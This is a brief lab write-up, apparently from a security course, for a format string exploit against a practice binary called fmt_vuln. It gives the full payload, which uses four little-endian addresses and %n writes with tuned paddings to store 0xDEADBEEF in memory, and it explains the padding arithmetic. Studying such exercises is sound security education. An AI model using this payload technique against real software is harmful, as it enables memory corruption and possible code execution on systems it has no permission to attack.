# Format for running program:

- Payload: ./fmt_vuln `python -c 'print("\x30\xa0\x04\x08"+"JUNK" + "\x31\xa0\x04\x08"
+"JUNK" + "\x32\xa0\x04\x08"+"JUNK" + "\x33\xa0\x04\x08" +
"%08x."*9+"%130x%n" + "%207x%n"+ "%239x%n"+ "%305x%n")'`

# Padding Information:

- "%130x%n" for “EF”

- "%207x%n" for “BE” 

- "%239x%n" for “AD”

- "%305x%n" for “DE”

# Comments:

- I have achieved the required string “DEADBEEF” which is basically hexadecimal values ‘D=13’,‘E=14’,‘A=10’,‘B=11’,and ‘F=15’

- This was done by incrementing the values of the address through its LSB (Least Significant Bit) hence, starting from – “0x0804A030” to “0x0804A033” and gradually adjusting the paddings for each address by either incrementing or decrementing the padding values.

- Within the Little Endian format the addresses were:

- "\x30\xa0\x04\x08"

- "\x31\xa0\x04\x08"

- "\x32\xa0\x04\x08"

- "\x33\xa0\x04\x08"
